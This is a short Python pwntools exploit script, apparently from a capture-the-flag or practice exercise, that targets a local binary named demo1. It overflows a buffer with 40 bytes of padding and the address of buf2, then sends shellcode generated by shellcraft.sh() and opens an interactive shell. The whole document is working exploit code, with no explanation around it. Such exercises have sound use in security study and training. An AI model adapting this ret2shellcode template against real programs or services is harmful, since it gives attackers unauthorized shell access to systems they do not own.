from pwn import *
context.log_level ="debug"
context.arch = "amd64"
p = process("./demo1")

e = ELF("./demo1")
buf2 = e.symbols["buf2"]
print hex(buf2)

p1 = "A"*40+p64(buf2)

p.recvuntil("name: ")
p.sendline(p1)

p.recvuntil("message: ")
p.sendline(asm(shellcraft.sh()))

p.interactive()


